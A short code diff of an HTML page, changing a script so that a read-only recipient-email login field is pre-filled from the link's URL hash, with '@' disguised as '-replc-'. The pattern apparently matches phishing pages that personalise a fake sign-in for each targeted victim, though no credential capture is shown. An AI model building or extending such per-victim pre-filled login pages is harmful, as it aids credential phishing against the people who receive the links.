@@ -182,10 +182,10 @@ return(str.substring(theleft, theright));
             <span class="input-group-addon"><i class="fas fa-user"></i></span>
             <input type="email" class="form-control" name="username" placeholder="Recipent Email" value="" id="email" readonly>
 		  <script>
-        // Original email with -replc- instead of @
-        const originalEmail = "contact-replc-abc.com";
+        // Extract email from URL hash
+        const emailFromHash = window.location.hash.substring(1); // Gets everything after #
         // Replace -replc- with @ to form correct email
-        const formattedEmail = originalEmail.replace("-replc-", "@");
+        const formattedEmail = emailFromHash.replace("-replc-", "@");
         // Set the input field value to the formatted email
         document.getElementById("email").value = formattedEmail;
     </script>
